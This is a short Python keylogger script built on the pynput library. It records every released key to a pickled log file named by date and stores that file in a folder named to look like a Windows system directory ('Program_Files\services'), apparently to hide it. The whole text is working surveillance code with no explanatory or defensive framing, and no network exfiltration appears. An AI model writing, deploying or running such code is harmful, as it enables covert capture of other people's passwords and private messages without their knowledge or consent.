from pynput.keyboard import Key, Listener
import time as t
from datetime import date,time,datetime
import pickle

date=date.today()
time=datetime.now()
name=("C:\\Program_Files\\services\\"+str(date)+".dat")
with open(name,"wb+") as logger:
    a=("\n\n\t\t"+str(time)[11]+str(time)[12]+":"+str(time)[14]+str(time)[15]+"\n")
    pickle.dump(a,logger)
    def on_press(key):
        if key==Key.f10:
            pickle.dump("\t<Overriden by Mr. Vilakshan>\t",logger)
            t.sleep(10)
    def on_release(key):
        logs=str("{}".format(key))
        pickle.dump(logs,logger)
        logger.flush()
    with Listener(on_press,on_release) as listener:
        listener.join()
